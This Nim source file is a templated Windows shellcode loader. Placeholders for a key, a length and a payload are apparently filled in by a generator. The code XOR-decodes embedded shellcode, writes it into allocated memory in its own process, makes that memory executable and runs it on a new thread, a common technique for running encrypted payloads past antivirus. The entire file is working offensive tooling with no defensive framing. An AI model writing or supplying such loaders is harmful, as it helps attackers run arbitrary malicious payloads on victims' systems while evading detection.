import winim/lean


proc xorEncrypt[I, J, byte](code: array[I, byte], key: array[J, byte]): array[I, byte] =
  var result: array[I, byte]
  for i in 0 ..< code.len:
    result[i] = code[i] xor key[i mod key.len]
  return result

proc Ldr1[I, T](shellcode: array[I, T]): void =

    let tId = GetCurrentProcessId()
    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tId)

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
    )
    var key: array[8, byte] = [byte {{Key}} ]

    var shellcode: array[{{Len}}, byte] = xorEncrypt(shellcode, key)

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    var oldProtect: DWORD
    let rv = VirtualProtect(rPtr, shellcode.len, PAGE_EXECUTE_READ, cast[PDWORD](addr(oldProtect)))

    if rv != 0:
        var tHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](rPtr), nil, 0, nil)
        WaitForSingleObject(tHandle, -1)

when defined(windows):

    var shellcode: array[{{Len}}, byte] = [
        byte {{Shellcode}} ]

    when isMainModule:
        Ldr1(shellcode)